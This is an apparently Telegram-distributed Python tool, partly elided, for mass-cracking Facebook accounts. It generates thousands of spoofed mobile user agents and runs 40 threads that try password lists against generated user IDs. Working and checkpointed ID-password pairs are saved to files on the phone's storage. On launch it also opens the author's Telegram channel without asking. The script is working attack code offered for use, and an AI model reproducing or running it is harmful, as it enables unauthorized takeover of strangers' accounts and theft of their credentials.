# Gift By Zehen
# Telegram Id : 
# Telegram : https://t.me/SMN_ATTACK_ZONE
# Facebook Group : 
...
for ua in range(5000):
	...
	h='Mobile Safari/537.36'
	zehenn=(f"{a} {b}; {xs} {nx} {c}{d}.{e}.{f}.{g} {h}")
	ugen.append(zehenn)


os.system("xdg-open https://t.me/SMN_ATTACK_ZONE")
logo =("""
                                                 
\033[1;32m ______    _____     _   _       _____     _   _ 
\033[1;32m(___  /   |  ___)   | | | |     |  ___)   | \ | |
\033[1;36m   / /____| |_ _____| |_| |_____| |_ _____|  \| |
\033[1;36m  / (_____)  _|_____)  _  (_____)  _|_____)     |
\033[1;32m / /__    | |___    | | | |     | |___    | |\  |
\033[1;32m/_____)   |_____)   |_| |_|     |_____)   |_| \_|
...
\033[1;91m╔═════════════════════════╗
\033[1;92m  ᏀᏆҒͲ ᏴƳ ZEHEN = ᏙᎬᎡՏᏆϴΝ = 7.7
\033[1;91m╚═════════════════════════╝
""") 
...
def Zehen():
    ...
    print("\033[1;96m ╚═════════════════════════════════╝")
    print("")
    Zehen = input(f'\033[1;32m ՏᎬᏞᎬᏟͲᎬᎠ ƳϴႮᎡ ϴᏢͲᏆϴΝ :\033[1;36m ')
    if Zehen in ["1","A"]:
        Zehens()
    if Zehen in ["2","B"]:
        os.system('xdg-open https://facebook.com/groups/1713018672413612/')
...
def Zehen():
    ...
    with ThreadPool(max_workers=40) as Fb_crack:
        ...
        for love in user:
            ...
            uid = code+love
            Fb_crack.submit(Zehenm,uid,pwx,tl)
    print("\033[1;91m╔═══════════════════════════╗")
    print(' \033[1;91m[\033[1;92m😚\033[1;91m]\033[1;92m HACKED COMPLETE ')
    print(' \033[1;91m[\033[1;92m😚\033[1;91m]\033[1;92m HI IM ZEHEN ')
    print("\033[1;91m╚═══════════════════════════╝")


def Zehenm(uid,pwx,tl):
    global loop
    global cps
    global oks
    global agents
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/ZEHEN-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                open('/sdcard/ZEHEN-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
